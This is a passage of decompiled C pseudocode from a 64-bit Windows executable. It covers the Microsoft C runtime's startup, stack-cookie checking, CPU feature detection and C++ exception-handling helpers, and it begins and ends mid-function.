  v0 = sub_140010FA0();
  set_new_mode(v0);
}


// ----- ?__scrt_common_main_seh@@YAHXZ @ 0x140010664 -----
__int64 __fastcall __scrt_common_main_seh()
{
  __int64 v0; // rcx
  char v1; // si
  char v2; // bl
  __int64 v3; // rcx
  __int64 v5; // rcx
  _QWORD *v6; // rax
  __int64 v7; // rcx
  void (__fastcall **v8)(_QWORD, __int64); // rbx
  _QWORD *v9; // rax
  __int64 v10; // rcx
  _QWORD *v11; // rbx
  const char **v12; // rdi
  __int64 v13; // rcx
  const char **v14; // rbx
  __int64 v15; // rcx
  int *v16; // rax
  unsigned int v17; // ebx
  __int64 v18; // rcx
  __int64 v19; // rcx

  if ( (unsigned __int8)_scrt_initialize_crt(1) == 0 )
    RtlFailFast(7);
  v1 = 0;
  v2 = _scrt_acquire_startup_lock(v0);
  v3 = (unsigned int)dword_1400A0030;
  if ( dword_1400A0030 == 1 )
    RtlFailFast(7);
  if ( dword_1400A0030 != 0 )
  {
    v1 = 1;
  }
  else
  {
    dword_1400A0030 = 1;
    if ( (unsigned int)sub_140019598(&unk_14002D3F8, &unk_14002D438) != 0 )
      return 255;
    sub_140019560(&unk_14002D3A8, &unk_14002D3F0);
    dword_1400A0030 = 2;
  }
  LOBYTE(v3) = v2;
  _scrt_release_startup_lock(v3);
  v6 = (_QWORD *)sub_140010FF8(v5);
  v8 = (void (__fastcall **)(_QWORD, __int64))v6;
  if ( *v6 != 0 && (unsigned __int8)_scrt_is_nonwritable_in_current_image(v6) != 0 )
    (*v8)(0, 2);
  v9 = (_QWORD *)sub_140011000(v7);
  v11 = v9;
  if ( *v9 != 0 && (unsigned __int8)_scrt_is_nonwritable_in_current_image(v9) != 0 )
    sub_140019878(*v11);
  v12 = (const char **)unknown_libname_83(v10);
  v14 = *(const char ***)sub_140019A44(v13);
  v16 = (int *)sub_140019A3C(v15);
  v17 = main(*v16, v14, v12);
  if ( (unsigned __int8)sub_140011024(v18) == 0 )
    exit(v17);
  if ( v1 == 0 )
    cexit();
  LOBYTE(v19) = 1;
  _scrt_uninitialize_crt(v19, 0);
  return v17;
}


// ----- start @ 0x1400107e0 -----
__int64 start()
{
  sub_140010EF0();
  return __scrt_common_main_seh();
}


// ----- ??2@YAPEAX_K@Z @ 0x1400107f4 -----
void *__fastcall operator new(size_t Size)
{
  size_t i; // rbx
  void *result; // rax

  for ( i = Size; ; Size = i )
  {
    result = j__malloc_base(Size);
    if ( result != nullptr )
      break;
    if ( (unsigned int)sub_14001B3B0(i) == 0 )
    {
      if ( i != -1 )
        sub_14000F820();
      sub_14001115C();
      __debugbreak();
    }
  }
  return result;
}


// ----- j_j__free_base @ 0x140010830 -----
// attributes: thunk
void __cdecl j_j__free_base(void *Block)
{
  j__free_base(Block);
}


// ----- j_j_j__free_base @ 0x140010838 -----
// attributes: thunk
void __cdecl j_j_j__free_base(void *Block)
{
  j_j__free_base(Block);
}


// ----- __scrt_acquire_startup_lock @ 0x140010840 -----
char _scrt_acquire_startup_lock()
{
  PVOID StackBase; // rcx
  signed __int64 v1; // rax

  if ( (unsigned int)_scrt_is_ucrt_dll_in_use() != 0 )
  {
    StackBase = NtCurrentTeb()->NtTib.StackBase;
    while ( 1 )
    {
      v1 = _InterlockedCompareExchange64(&qword_1400A0038, (signed __int64)StackBase, 0);
      if ( v1 == 0 )
        break;
      if ( StackBase == (PVOID)v1 )
        return 1;
    }
  }
  return 0;
}


// ----- __scrt_initialize_crt @ 0x14001087c -----
char __fastcall _scrt_initialize_crt(int a1)
{
  if ( a1 == 0 )
    byte_1400A0040 = 1;
  sub_140010BEC();
  if ( (unsigned __int8)sub_1400123C0() == 0 )
    return 0;
  if ( (unsigned __int8)sub_14001B9DC() == 0 )
  {
    _vcrt_uninitialize(false);
    return 0;
  }
  return 1;
}


// ----- __scrt_initialize_onexit_tables @ 0x1400108b8 -----
char __fastcall _scrt_initialize_onexit_tables(unsigned int a1)
{
  if ( byte_1400A0041 == 0 )
  {
    if ( a1 > 1 )
      RtlFailFast(5);
    if ( (unsigned int)_scrt_is_ucrt_dll_in_use() == 0 || a1 != 0 )
    {
      *(__m128i *)&stru_1400A0048._first = _mm_load_si128((const __m128i *)&xmmword_14008EDC0);
      stru_1400A0048._end = (_PVFV *)-1LL;
      *(_OWORD *)&stru_1400A0060._first = *(_OWORD *)&stru_1400A0048._first;
      stru_1400A0060._end = (_PVFV *)-1LL;
    }
    else if ( initialize_onexit_table(&stru_1400A0048) != 0 || initialize_onexit_table(&stru_1400A0060) != 0 )
    {
      return 0;
    }
    byte_1400A0041 = 1;
  }
  return 1;
}


// ----- __scrt_is_nonwritable_in_current_image @ 0x140010944 -----
bool __fastcall _scrt_is_nonwritable_in_current_image(__int64 a1)
{
  _DWORD *v2; // rcx
  unsigned __int64 v3; // r8
  _DWORD *v4; // rdx
  _DWORD *v5; // r9
  unsigned __int64 v6; // rcx

  if ( MEMORY[0x140000000] != 23117 )
    return false;
  v2 = (_DWORD *)(0x140000000LL + MEMORY[0x14000003C]);
  if ( *v2 != 17744 || *(_WORD *)(0x140000018LL + MEMORY[0x14000003C]) != 523 )
    return false;
  v3 = a1 - 0x140000000LL;
  v4 = (_DWORD *)((char *)v2 + *(unsigned __int16 *)(0x140000014LL + MEMORY[0x14000003C]) + 24);
  v5 = &v4[10 * *(unsigned __int16 *)(0x140000006LL + MEMORY[0x14000003C])];
  while ( v4 != v5 )
  {
    v6 = (unsigned int)v4[3];
    if ( v3 >= v6 && v3 < (unsigned int)(v6 + v4[2]) )
      return v4 != nullptr && v4[9] >= 0;
    v4 += 10;
  }
  v4 = nullptr;
  return v4 != nullptr && v4[9] >= 0;
}


// ----- __scrt_release_startup_lock @ 0x1400109dc -----
__int64 __fastcall _scrt_release_startup_lock(char a1)
{
  __int64 result; // rax

  result = _scrt_is_ucrt_dll_in_use();
  if ( (_DWORD)result != 0 && a1 == 0 )
    _InterlockedExchange64(&qword_1400A0038, 0);
  return result;
}


// ----- __scrt_uninitialize_crt @ 0x140010a00 -----
char __fastcall _scrt_uninitialize_crt(__crt_bool a1, char a2)
{
  if ( byte_1400A0040 == 0 || a2 == 0 )
  {
    _acrt_uninitialize(a1);
    _vcrt_uninitialize(a1);
  }
  return 1;
}


// ----- _onexit @ 0x140010a2c -----
_onexit_t __cdecl onexit(_onexit_t Func)
{
  int v2; // eax
  int (__cdecl *v3)(); // rdx

  if ( stru_1400A0048._first == (_PVFV *)-1LL )
    v2 = sub_14001B7EC(Func);
  else
    v2 = register_onexit_function(&stru_1400A0048, Func);
  v3 = nullptr;
  if ( v2 == 0 )
    return Func;
  return v3;
}


// ----- atexit @ 0x140010a68 -----
int __cdecl atexit(void (__cdecl *a1)())
{
  return (onexit((_onexit_t)a1) != nullptr) - 1;
}


// ----- __GSHandlerCheck @ 0x140010a80 -----
__int64 __fastcall _GSHandlerCheck(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  sub_140010AA0(a2, a4, *(_QWORD *)(a4 + 56));
  return 1;
}


// ----- sub_140010AA0 @ 0x140010aa0 -----
__int64 __fastcall sub_140010AA0(__int64 a1, __int64 a2)
{
  __int64 v3; // rcx
  __int64 v4; // rax

  v3 = *(unsigned int *)(*(_QWORD *)(a2 + 16) + 8LL);
  v4 = *(_QWORD *)(a2 + 8);
  if ( (*(_BYTE *)(v3 + v4 + 3) & 0xF) != 0 )
    return a1 + (*(_BYTE *)(v3 + v4 + 3) & 0xF0);
  else
    return a1;
}


// ----- sub_140010B04 @ 0x140010b04 -----
__int64 __fastcall sub_140010B04(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rbx
  __int64 result; // rax

  v4 = *(_QWORD *)(a4 + 56);
  sub_140010AA0(a2, a4);
  result = 1;
  if ( ((((*(_DWORD *)(a1 + 4) & 0x66) != 0) + 1) & *(_DWORD *)(v4 + 4)) != 0 )
    return sub_140011F60(a1);
  return result;
}


// ----- __security_check_cookie @ 0x140010ba0 -----
void __cdecl _security_check_cookie(uintptr_t StackCookie)
{
  __int64 v1; // rcx

  if ( StackCookie != _security_cookie )
ReportFailure:
    _report_gsfailure(StackCookie);
  v1 = __ROL8__(StackCookie, 16);
  if ( (_WORD)v1 != 0 )
  {
    StackCookie = __ROR8__(v1, 16);
    goto ReportFailure;
  }
}


// ----- sub_140010BC0 @ 0x140010bc0 -----
_QWORD *__fastcall sub_140010BC0(_QWORD *a1, char a2)
{
  *a1 = &type_info::`vftable';
  if ( (a2 & 1) != 0 )
    j_j_j__free_base(a1);
  return a1;
}


// ----- sub_140010BEC @ 0x140010bec -----
__int64 sub_140010BEC()
{
  int v5; // ebp
  bool v7; // zf
  int v12; // edi
  int v13; // eax
  unsigned __int64 v14; // rax
  __int64 v15; // rcx
  int v16; // r8d
  int v17; // r9d
  unsigned int v18; // r11d
  int v24; // esi
  int v25; // r10d
  unsigned __int64 v36; // rax
  int v37; // eax
  unsigned __int64 v38; // rax
  __int64 v39; // rdx
  int v41; // [rsp+20h] [rbp+8h]

  _RAX = 0;
  __asm { cpuid }
  v5 = _RAX;
  _RAX = 1;
  v7 = ((unsigned int)_RBX ^ 0x756E6547 | (unsigned int)_RCX ^ 0x6C65746E | (unsigned int)_RDX ^ 0x49656E69) == 0;
  __asm { cpuid }
  v12 = _RCX;
  if ( v7
    && ((v13 = _RAX & 0xFFF3FF0, qword_14009E910 = 0x8000, qword_14009E918 = -1, v13 == 67264)
     || v13 == 132704
     || v13 == 132720
     || (unsigned int)(v14 = (unsigned int)(v13 - 198224)) <= 0x20 && (v15 = 0x100010001LL, _bittest64(&v15, v14))) )
  {
    v16 = dword_1400A0078 | 1;
    dword_1400A0078 |= 1u;
  }
  else
  {
    v16 = dword_1400A0078;
  }
  v17 = 0;
  v18 = 0;
  if ( v5 < 7 )
  {
    v25 = 0;
    v24 = 0;
  }
  else
  {
    _RAX = 7;
    __asm { cpuid }
    v24 = _RDX;
    v25 = _RBX;
    if ( (_RBX & 0x200) != 0 )
      dword_1400A0078 = v16 | 2;
    if ( (int)_RAX >= 1 )
    {
      _RAX = 7;
      __asm { cpuid }
      v17 = _RDX;
    }
    _RAX = 36;
    if ( v5 >= 36 )
    {
      __asm { cpuid }
      v18 = _RBX;
    }
  }
  v36 = qword_14009E920 & 0xFFFFFFFFFFFFFFFEuLL;
  dword_14009E908 = 1;
  dword_14009E90C = 2;
  qword_14009E920 &= ~1uLL;
  if ( (v12 & 0x100000) != 0 )
  {
    v36 &= ~0x10uLL;
    dword_14009E908 = 2;
    qword_14009E920 = v36;
    dword_14009E90C = 6;
  }
  if ( (v12 & 0x8000000) != 0 )
  {
    __asm { xgetbv }
    v41 = v36;
    if ( (v12 & 0x10000000) == 0 || (v36 & 6) != 6 )
    {
LABEL_33:
      if ( (v17 & 0x200000) != 0 && (*(_QWORD *)&v41 & 0x80000LL) != 0 )
        qword_14009E920 &= ~0x80uLL;
      return 0;
    }
    v37 = dword_14009E90C | 8;
    dword_14009E908 = 3;
    dword_14009E90C |= 8u;
    if ( (v25 & 0x20) != 0 )
    {
      dword_14009E908 = 5;
      dword_14009E90C = v37 | 0x20;
      v38 = qword_14009E920 & 0xFFFFFFFFFFFFFFFDuLL;
      qword_14009E920 &= ~2uLL;
      if ( (v25 & 0xD0030000) != 0xD0030000 )
      {
LABEL_27:
        if ( (v24 & 0x800000) != 0 )
          qword_14009E920 = v38 & 0xFFFFFFFFFEFFFFFFuLL;
        if ( (v17 & 0x80000) != 0 && (v41 & 0xE0) == 0xE0 )
        {
          dword_1400A007C = v18 & 0x400FF;
          v39 = ~(HIWORD(v18) & 6 | 0x1000029LL) & qword_14009E920;
          qword_14009E920 = v39;
          if ( (unsigned __int8)v18 > 1u )
            qword_14009E920 = v39 & 0xFFFFFFFFFFFFFFBFuLL;
        }
        goto LABEL_33;
      }
      if ( (v41 & 0xE0) == 0xE0 )
      {
        dword_14009E90C |= 0x40u;
        v38 = qword_14009E920 & 0xFFFFFFFFFFFFFFDBuLL;
        dword_14009E908 = 6;
        qword_14009E920 &= 0xFFFFFFFFFFFFFFDBuLL;
        goto LABEL_27;
      }
    }
    v38 = qword_14009E920;
    goto LABEL_27;
  }
  return 0;
}


// ----- _guard_check_icall_nop @ 0x140010e88 -----
void guard_check_icall_nop()
{
  ;
}


// ----- __alloca_probe @ 0x140010ea0 -----
unsigned __int64 __fastcall _alloca_probe()
{
  unsigned __int64 result; // rax
  char *v1; // r10
  char *StackLimit; // r11
  char v3; // [rsp+18h] [rbp+8h] BYREF

  v1 = &v3 - result;
  if ( (unsigned __int64)&v3 < result )
    v1 = nullptr;
  StackLimit = (char *)NtCurrentTeb()->NtTib.StackLimit;
  if ( v1 < StackLimit )
  {
    LOWORD(v1) = (unsigned __int16)v1 & 0xF000;
    do
    {
      StackLimit -= 4096;
      *StackLimit = 0;
    }
    while ( v1 != StackLimit );
  }
  return result;
}


// ----- sub_140010EF0 @ 0x140010ef0 -----
__int64 sub_140010EF0()
{
  uintptr_t v0; // rax
  __int64 result; // rax
  struct _FILETIME v2; // [rsp+20h] [rbp-10h] BYREF
  struct _FILETIME SystemTimeAsFileTime; // [rsp+40h] [rbp+10h] BYREF
  LARGE_INTEGER PerformanceCount; // [rsp+48h] [rbp+18h] BYREF

  v0 = _security_cookie;
  if ( _security_cookie == 0x2B992DDFA232LL )
  {
    SystemTimeAsFileTime = 0;
    GetSystemTimeAsFileTime(&SystemTimeAsFileTime);
    v2 = SystemTimeAsFileTime;
    v2 = (struct _FILETIME)(GetCurrentThreadId() ^ *(unsigned __int64 *)&v2);
    v2 = (struct _FILETIME)(GetCurrentProcessId() ^ *(unsigned __int64 *)&v2);
    QueryPerformanceCounter(&PerformanceCount);
    v0 = ((unsigned __int64)&v2
        ^ *(_QWORD *)&v2
        ^ PerformanceCount.QuadPart
        ^ ((unsigned __int64)PerformanceCount.LowPart << 32))
       & 0xFFFFFFFFFFFFLL;
    if ( v0 == 0x2B992DDFA232LL )
      v0 = 0x2B992DDFA233LL;
    _security_cookie = v0;
  }
  result = ~v0;
  qword_14009E900 = result;
  return result;
}


// ----- sub_140010FA0 @ 0x140010fa0 -----
__int64 sub_140010FA0()
{
  return 0;
}


// ----- ?raw_length@charNode@@UEBAHXZ @ 0x140010fa4 -----
__int64 __fastcall charNode::raw_length(charNode *this)
{
  return 1;
}


// ----- _get_startup_file_mode @ 0x140010fac -----
__int64 get_startup_file_mode()
{
  return 0x4000;
}


// ----- sub_140010FB4 @ 0x140010fb4 -----
void sub_140010FB4()
{
  InitializeSListHead(&stru_1400A0080);
}


// ----- sub_140010FC4 @ 0x140010fc4 -----
char sub_140010FC4()
{
  return 1;
}


// ----- sub_140010FC8 @ 0x140010fc8 -----
void *sub_140010FC8()
{
  return &unk_1400A0090;
}


// ----- __scrt_initialize_default_local_stdio_options @ 0x140010fd0 -----
_QWORD *_scrt_initialize_default_local_stdio_options()
{
  _QWORD *v0; // rax
  _QWORD *result; // rax

  v0 = sub_140010230();
  *v0 |= 0x24uLL;
  result = sub_140010FC8();
  *result |= 2uLL;
  return result;
}


// ----- __scrt_is_user_matherr_present @ 0x140010fec -----
_BOOL8 _scrt_is_user_matherr_present()
{
  return dword_14009E930 == 0;
}


// ----- sub_140010FF8 @ 0x140010ff8 -----
void *sub_140010FF8()
{
  return &unk_1400A0BF8;
}


// ----- sub_140011000 @ 0x140011000 -----
void *sub_140011000()
{
  return &unk_1400A0BF0;
}


// ----- sub_140011008 @ 0x140011008 -----
void sub_140011008()
{
  dword_1400A0098 = 0;
}


// ----- RtlFailFast @ 0x140011014 -----
void __fastcall __noreturn RtlFailFast(unsigned int a1)
{
  __fastfail(a1);
}


// ----- nullsub_2 @ 0x140011018 -----
void nullsub_2()
{
  ;
}


// ----- sub_14001101C @ 0x14001101c -----
// attributes: thunk
__int64 sub_14001101C(void)
{
  return sub_140010FA0();
}


// ----- sub_140011024 @ 0x140011024 -----
bool sub_140011024()
{
  HMODULE ModuleHandleW; // rax
  __int64 v1; // rcx

  ModuleHandleW = GetModuleHandleW(nullptr);
  return ModuleHandleW != nullptr
      && *(_WORD *)ModuleHandleW == 23117
      && *(_DWORD *)((char *)ModuleHandleW + (v1 = *((int *)ModuleHandleW + 15))) == 17744
      && *(_WORD *)((char *)ModuleHandleW + v1 + 24) == 523
      && *(_DWORD *)((char *)ModuleHandleW + v1 + 132) > 0xEu
      && *(_DWORD *)((char *)ModuleHandleW + v1 + 248) != 0;
}


// ----- __scrt_set_unhandled_exception_filter @ 0x140011078 -----
LPTOP_LEVEL_EXCEPTION_FILTER _scrt_set_unhandled_exception_filter()
{
  return SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)_scrt_unhandled_exception_filter);
}


// ----- __scrt_unhandled_exception_filter @ 0x140011088 -----
__int64 __fastcall _scrt_unhandled_exception_filter(_QWORD *a1)
{
  _DWORD *v1; // rbx
  int v3; // edx
  __int64 v5; // rbx

  v1 = (_DWORD *)*a1;
  if ( *(_DWORD *)*a1 == -529697949 && v1[6] == 4 )
  {
    v3 = v1[8];
    if ( (unsigned int)(v3 - 429065504) <= 2 || v3 == 26820608 )
    {
      *(_QWORD *)_current_exception() = v1;
      v5 = a1[1];
      *(_QWORD *)_current_exception_context() = v5;
      sub_14001BA28();
    }
  }
  return 0;
}


// ----- sub_1400110E4 @ 0x1400110e4 -----
void sub_1400110E4()
{
  void (**i)(void); // rbx

  for ( i = qword_14009A610; i < qword_14009A610; ++i )
  {
    if ( *i != nullptr )
      (*i)();
  }
}


// ----- sub_140011120 @ 0x140011120 -----
void __fastcall sub_140011120()
{
  void (**i)(void); // rbx

  for ( i = &qword_14009A620; i < &qword_14009A620; ++i )
  {
    if ( *i != nullptr )
      (*i)();
  }
}


// ----- sub_14001115C @ 0x14001115c -----
void __noreturn sub_14001115C()
{
  _BYTE v0[40]; // [rsp+20h] [rbp-28h] BYREF

  std::bad_array_new_length::bad_array_new_length((std::bad_array_new_length *)v0);
  sub_140011278(v0, &_TI3_AVbad_array_new_length_std__);
  __debugbreak();
}


// ----- __scrt_is_ucrt_dll_in_use @ 0x14001117c -----
_BOOL8 _scrt_is_ucrt_dll_in_use()
{
  return dword_1400A0BEC != 0;
}


// ----- __report_gsfailure @ 0x140011188 -----
void __cdecl __noreturn _report_gsfailure(uintptr_t StackCookie)
{
  __fastfail(2u);
}


// ----- nullsub_3 @ 0x14001118f -----
void nullsub_3()
{
  ;
}


// ----- __report_rangecheckfailure @ 0x140011190 -----
void __noreturn _report_rangecheckfailure()
{
  __fastfail(8u);
}


// ----- nullsub_4 @ 0x140011197 -----
void nullsub_4()
{
  ;
}


// ----- sub_1400111A0 @ 0x1400111a0 -----
__int64 sub_1400111A0()
{
  return qword_1400A00A8;
}


// ----- _purecall @ 0x1400111ac -----
void __noreturn purecall()
{
  void (*v0)(void); // rax

  v0 = (void (*)(void))sub_1400111A0();
  if ( v0 != nullptr )
    v0();
  abort();
}


// ----- sub_1400111C8 @ 0x1400111c8 -----
void __fastcall sub_1400111C8(__int64 *a1, __int64 a2)
{
  __int64 v4; // rcx
  __int64 v5; // rax
  __int64 v6; // rbp
  void *v7; // rax
  void *v8; // rsi

  if ( *((_BYTE *)a1 + 8) != 0 && (v4 = *a1) != 0 )
  {
    v5 = -1;
    do
      ++v5;
    while ( *(_BYTE *)(v4 + v5) != 0 );
    v6 = v5 + 1;
    v7 = j__malloc_base(v5 + 1);
    v8 = v7;
    if ( v7 != nullptr )
    {
      sub_14001BA50(v7, v6, *a1);
      *(_QWORD *)a2 = v8;
      *(_BYTE *)(a2 + 8) = 1;
    }
    j__free_base(nullptr);
  }
  else
  {
    *(_QWORD *)a2 = *a1;
    *(_BYTE *)(a2 + 8) = 0;
  }
}


// ----- sub_140011250 @ 0x140011250 -----
void __fastcall sub_140011250(__int64 a1)
{
  if ( *(_BYTE *)(a1 + 8) != 0 )
    j__free_base(*(void **)a1);
  *(_BYTE *)(a1 + 8) = 0;
  *(_QWORD *)a1 = 0;
}


// ----- sub_140011278 @ 0x140011278 -----
void __fastcall sub_140011278(_QWORD *a1, _BYTE *a2)
{
  _BYTE *v2; // rbx
  ULONG_PTR v4; // rdi
  __int64 v5; // rcx
  PVOID v6; // rax
  PVOID BaseOfImage; // [rsp+20h] [rbp-38h] BYREF
  ULONG_PTR Arguments[6]; // [rsp+28h] [rbp-30h] BYREF

  v2 = a2;
  v4 = 429065504;
  if ( a2 != nullptr && (*a2 & 0x10) != 0 )
  {
    v5 = *a1 - 8LL;
    v2 = *(_BYTE **)(*(_QWORD *)v5 + 48LL);
    (*(void (__fastcall **)(__int64))(*(_QWORD *)v5 + 64LL))(v5);
  }
  v6 = nullptr;
  BaseOfImage = nullptr;
  if ( v2 != nullptr )
  {
    v6 = RtlPcToFileHeader(v2, &BaseOfImage);
    BaseOfImage = v6;
    if ( (*v2 & 8) != 0 || v6 == nullptr )
      v4 = 26820608;
  }
  Arguments[0] = v4;
  Arguments[1] = (ULONG_PTR)a1;
  Arguments[2] = (ULONG_PTR)v2;
  Arguments[3] = (ULONG_PTR)v6;
  RaiseException(0xE06D7363, 1u, 4u, Arguments);
}


// ----- sub_140011320 @ 0x140011320 -----
__int64 __fastcall sub_140011320(unsigned int *a1, __int64 a2, __int64 a3)
{
  __int64 v4; // rax
  _QWORD v6[3]; // [rsp+50h] [rbp-18h] BYREF

  v6[0] = a1;
  v6[1] = a3;
  v4 = sub_14001244C();
  (*(void (__fastcall **)(_QWORD, _QWORD *))(v4 + 16))(*a1, v6);
  return 0;
}


// ----- sub_140011374 @ 0x140011374 -----
__int64 __fastcall sub_140011374(unsigned int *a1, __int64 a2, __int64 a3)
{
  __int64 v4; // rax
  _QWORD v6[3]; // [rsp+50h] [rbp-18h] BYREF

  v6[0] = a1;
  v6[1] = a3;
  v4 = sub_14001244C();
  (*(void (__fastcall **)(_QWORD, _QWORD *))(v4 + 16))(*a1, v6);
  return 0;
}


// ----- sub_1400113C8 @ 0x1400113c8 -----
__int64 __fastcall sub_1400113C8(__int64 a1, int a2)
{
  int v2; // ebx
  __int64 result; // rax

  v2 = *(_DWORD *)(a1 + 12);
  while ( v2 != 0 )
  {
    result = *(_QWORD *)(sub_14001244C() + 96) + 20LL * (unsigned int)--v2 + *(int *)(a1 + 16);
    if ( a2 > *(_DWORD *)(result + 4) && a2 <= *(_DWORD *)(result + 8) )
      return result;
  }
  return 0;
}


// ----- sub_14001141C @ 0x14001141c -----
__int64 __fastcall sub_14001141C(_BYTE *a1, __int64 a2, __int64 a3, int a4, char a5)
{
  char v5; // bl
  int *v6; // r10
  __int64 v11; // rcx
  int v12; // eax
  int v13; // eax
  int v14; // r8d
  _BYTE *v15; // rdx
  _BYTE *v16; // r9
  __int64 v17; // rcx
  _DWORD *v18; // r9
  unsigned int v19; // r10d
  __int64 v20; // rcx

  v5 = *a1;
  v6 = (int *)(a1 + 1);
  *(_BYTE *)a2 = *a1;
  if ( (v5 & 4) != 0 )
  {
    v11 = *(_BYTE *)v6 & 0xF;
    v6 = (int *)((char *)v6 - byte_14008FFB0[v11]);
    *(_DWORD *)(a2 + 4) = (unsigned int)*(v6 - 1) >> byte_14008FFB0[v11 + 16];
  }
  if ( (v5 & 8) != 0 )
  {
    v12 = *v6++;
    *(_DWORD *)(a2 + 8) = v12;
  }
  if ( (v5 & 0x10) != 0 )
  {
    v13 = *v6++;
    *(_DWORD *)(a2 + 12) = v13;
  }
  v14 = 0;
  v15 = v6 + 1;
  if ( a5 != 0 || (v5 & 2) == 0 )
  {
    *(_DWORD *)(a2 + 16) = *v6;
  }
  else
  {
    *(_DWORD *)(a2 + 16) = 0;
    if ( *v6 == 0 )
      __fastfail(7u);
    v16 = (_BYTE *)(*v6 + a3);
    v17 = *v16 & 0xF;
    v18 = &v16[-byte_14008FFB0[v17]];
    v19 = *(v18 - 1) >> byte_14008FFB0[v17 + 16];
    if ( v19 != 0 )
    {
      while ( *v18 != a4 )
      {
        v18 += 2;
        if ( ++v14 >= v19 )
          goto LABEL_17;
      }
      *(_DWORD *)(a2 + 16) = v18[1];
    }
  }
LABEL_17:
  if ( (v5 & 1) != 0 )
  {
    v20 = *v15 & 0xF;
    v15 -= byte_14008FFB0[v20];
    *(_DWORD *)(a2 + 20) = *((_DWORD *)v15 - 1) >> byte_14008FFB0[v20 + 16];
  }
  return v15 - a1;
}


// ----- ?ExecutionInCatch@__FrameHandler3@@SA_NPEAU_xDISPATCHER_CONTEXT@@PEBU_s_FuncInfo@@@Z @ 0x140011548 -----
static bool __fastcall __FrameHandler3::ExecutionInCatch(struct _xDISPATCHER_CONTEXT *a1, const struct _s_FuncInfo *a2)
{
  int v3; // eax

  v3 = sub_140012688(a2, a1);
  return sub_1400113C8((__int64)a2, v3) != 0;
}


// ----- ?ExecutionInCatch@__FrameHandler4@@SA_NPEAU_xDISPATCHER_CONTEXT@@PEAUFuncInfo4@FH4@@@Z @ 0x140011574 -----
static bool __fastcall __FrameHandler4::ExecutionInCatch(struct _xDISPATCHER_CONTEXT *a1, struct FH4::FuncInfo4 *a2)
{
  return *(_BYTE *)a2 & 1;
}


// ----- ?FrameUnwindToEmptyState@__FrameHandler3@@SAXPEA_KPEAU_xDISPATCHER_CONTEXT@@PEBU_s_FuncInfo@@@Z @ 0x14001157c -----
static void __fastcall __FrameHandler3::FrameUnwindToEmptyState(
        unsigned __int64 *a1,
        struct _xDISPATCHER_CONTEXT *a2,
        struct _s_FuncInfo *a3)
{
  unsigned __int64 *v5; // rsi
  int v6; // eax
  char v7; // [rsp+48h] [rbp+20h] BYREF

  v5 = (unsigned __int64 *)sub_140011614(a1, a2, a3, &v7);
  v6 = sub_140012688(a3, a2);
  sub_1400113C8((__int64)a3, v6);
  sub_140014E28(v5, a2, a3);
}


// ----- ?FrameUnwindToEmptyState@__FrameHandler4@@SAXPEA_KPEAU_xDISPATCHER_CONTEXT@@PEAUFuncInfo4@FH4@@@Z @ 0x1400115e0 -----
static void __fastcall __FrameHandler4::FrameUnwindToEmptyState(
        unsigned __int64 *a1,
        struct _xDISPATCHER_CONTEXT *a2,
        struct FH4::FuncInfo4 *a3)
{
  bool v3; // zf
  __int64 v4; // rcx
  __int64 v5; // [rsp+30h] [rbp+8h] BYREF

  v3 = (*(_BYTE *)a3 & 1) == 0;
  v4 = *a1;
  v5 = v4;
  if ( !v3 )
    v5 = *(_QWORD *)(*((unsigned int *)a3 + 5) + v4);
  sub_140014FC4(&v5, a2, a3, 0xFFFFFFFFLL);
}


// ----- sub_140011614 @ 0x140011614 -----
_QWORD *__fastcall sub_140011614(_QWORD *a1, ULONG64 *a2, __int64 a3, _QWORD *a4)
{
  __int64 v4; // rbx
  int v9; // ebp
  ULONG64 v10; // rsi
  __int64 v11; // rdi
  PRUNTIME_FUNCTION v12; // rax
  __int64 v13; // rdx
  unsigned __int64 v14; // r9
  unsigned int v15; // r8d
  unsigned __int64 ImageBase; // [rsp+50h] [rbp+8h] BYREF

  LODWORD(v4) = *(_DWORD *)(a3 + 12);
  v9 = sub_140012688(a3, a2);
  *a4 = *a1;
  while ( (_DWORD)v4 != 0 )
  {
    v4 = (unsigned int)(v4 - 1);
    v10 = a2[1];
    v11 = *(int *)(a3 + 16) + 20 * v4;
    if ( v9 > *(_DWORD *)(v11 + v10 + 4) && v9 <= *(_DWORD *)(v11 + v10 + 8) )
    {
      v12 = RtlLookupFunctionEntry(*a2, &ImageBase, nullptr);
      v13 = 0;
      v14 = ImageBase + *(int *)(v11 + v10 + 16);
      v15 = *(_DWORD *)(v11 + v10 + 12);
      if ( v15 != 0 )
      {
        while ( *(_DWORD *)(v14 + 20 * v13 + 12) != (unsigned __int64)v12->BeginAddress )
        {
          v13 = (unsigned int)(v13 + 1);
          if ( (unsigned int)v13 >= v15 )
            goto LABEL_7;
        }
LABEL_10:
        *a4 = *(_QWORD *)(*(int *)(v14 + 20 * v13 + 16) + *a1);
        return a4;
      }
LABEL_7:
      if ( (unsigned int)v13 < v15 )
        goto LABEL_10;
    }
  }
  return a4;
}


// ----- ?GetEstablisherFrame@__FrameHandler4@@SAPEA_KPEA_KPEAU_xDISPATCHER_CONTEXT@@PEAUFuncInfo4@FH4@@0@Z @ 0x1400116f4 -----
static unsigned __int64 *__fastcall __FrameHandler4::GetEstablisherFrame(
        unsigned __int64 *a1,
        struct _xDISPATCHER_CONTEXT *a2,
        struct FH4::FuncInfo4 *a3,
        unsigned __int64 *a4)
{
  *a4 = *a1;
  if ( (*(_BYTE *)a3 & 1) != 0 )
    *a4 = *(_QWORD *)(*((unsigned int *)a3 + 5) + *a1);
  return a4;
}


// ----- sub_140011718 @ 0x140011718 -----
__int64 __fastcall sub_140011718(__int64 a1, __int64 a2, int a3, __int64 a4, __int64 a5)
{
  unsigned int v9; // r14d
  int v10; // eax
  int v11; // r10d
  __int64 v12; // rsi
  __int64 v13; // rbx
  int v14; // r8d
  int v15; // r13d
  unsigned int v16; // ecx
  __int64 v17; // r11
  __int64 v18; // r9
  __int64 v19; // rdx
  unsigned int i; // ecx
  int v21; // ecx
  __int128 v23; // [rsp+20h] [rbp-38h]

  v9 = *(_DWORD *)(a5 + 12);
  v10 = sub_140012688(a5, a4);
  v11 = 0;
  if ( v9 == 0 )
    abort();
  v12 = *(_QWORD *)(a4 + 8);
  v13 = *(int *)(a5 + 16);
  v14 = -1;
  v15 = -1;
  v16 = v9;
  v17 = v12 + v13;
  while ( 1 )
  {
    v18 = v16 - 1;
    if ( v10 > *(_DWORD *)(v12 + 20 * v18 + v13 + 4) && v10 <= *(_DWORD *)(v17 + 20 * v18 + 8) )
      break;
    --v16;
    if ( (_DWORD)v18 == 0 )
    {
      v19 = 0;
      goto LABEL_7;
    }
  }
